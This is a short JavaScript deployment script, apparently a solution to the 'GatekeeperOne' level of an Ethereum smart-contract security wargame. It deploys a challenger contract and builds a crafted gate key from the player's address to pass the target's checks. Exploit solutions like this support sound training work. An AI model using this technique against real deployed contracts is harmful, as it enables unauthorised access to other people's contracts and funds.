const level13 = async (web3, deployer, GatekeeperOne, ChallengerOne) => {

    const targetAddress = '0x8ffba0ecfb69fef3eced185cba36aa737a607f70';
    console.log(`Exploiting Level13 target ${targetAddress}...`);

    console.log('Deploying the challenger contract...');
    const challenger = await deployer.deploy(ChallengerOne);

    console.log('Retrieving player address...');
    const player = (await web3.eth.getAccounts())[0];

    const key = '0xaabbccdd' + // any non-zero 4 byte value
        '0000' +
        player.slice(player.length - 4); // 2 bytes * 2 hex characters each

    console.log('Registering player...');
    await challenger.register(targetAddress, key, {from: player});
};

module.exports = level13;